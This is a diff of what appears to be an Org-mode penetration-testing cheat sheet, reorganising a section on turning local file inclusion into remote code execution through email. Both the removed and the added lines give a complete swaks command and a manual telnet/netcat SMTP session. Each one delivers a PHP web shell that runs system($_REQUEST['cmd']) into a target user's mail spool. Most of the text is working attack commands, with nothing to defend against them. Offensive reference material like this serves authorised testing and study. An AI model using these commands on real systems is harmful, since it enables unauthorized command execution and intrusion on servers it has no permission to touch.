@@ -1935,40 +1935,43 @@
          /var/mail/<user>
          /var/spool/mail/<user>
        #+end_src
-*** Send Email - LFI to RCE
-    - Using [[https://github.com/jetmore/swaks][swaks]]:
-      #+begin_src sh
-        swaks --to <user>@localhost --from test@test.net --header "Subject: test shell" --body 'SHELL-INIT:<pre> <?php system($_REQUEST["cmd"]); ?> </pre>:SHELL-END' --server <ip-port>
-        # Or --port <port> for non-standard
-      #+end_src
-    - Using ~telnet~:
-      #+begin_src sh
-        # nc -nC can also work
-        telnet <ip> <port>
-        # Keep the <...> below around emails
-        EHLO world
+*** Send Email
+**** Swaks
+     - [[https://github.com/jetmore/swaks][Site]] - Perl multipurpose SMTP tool
+       #+begin_src sh
+         # Send email - Exploit RCE
+         swaks --to <user>@localhost --from test@test.net --header "Subject: test shell" --body 'SHELL-INIT:<pre> <?php system($_REQUEST["cmd"]); ?> </pre>:SHELL-END' --server <ip-port>
+         # Or --port <port> for non-standard
+       #+end_src
+**** Telnet / Netcat
+     - Same RCE exploit as ~swaks~:
+       #+begin_src sh
+         # nc -nC can also work
+         telnet <ip> <port>
+         # Keep the <...> below around emails
+         EHLO world
 
-        MAIL FROM:<test@test.net>
+         MAIL FROM:<test@test.net>
 
-        RCPT TO:<[user]@localhost>
+         RCPT TO:<[user]@localhost>
 
-        DATA
+         DATA
 
-        # The body goes from here {
-        Date: $(LC_ALL=C date)
-        To: [user]@localhost
-        From: test@test.net
-        Subject: test shell
-        Message-Id: <20210218153300.1486384@test>
+         # The body goes from here {
+         Date: $(LC_ALL=C date)
+         To: [user]@localhost
+         From: test@test.net
+         Subject: test shell
+         Message-Id: <20210218153300.1486384@test>
 
-        SHELL-INIT:<pre> <?php system($_REQUEST["cmd"]); ?> </pre>:SHELL-END
+         SHELL-INIT:<pre> <?php system($_REQUEST["cmd"]); ?> </pre>:SHELL-END
 
 
-        .
-        # } To here where it automatically ends
+         .
+         # } To here, where it automatically ends
 
-        QUIT
-      #+end_src
+         QUIT
+       #+end_src
 ** POP3
 *** Read Emails
 **** Telnet
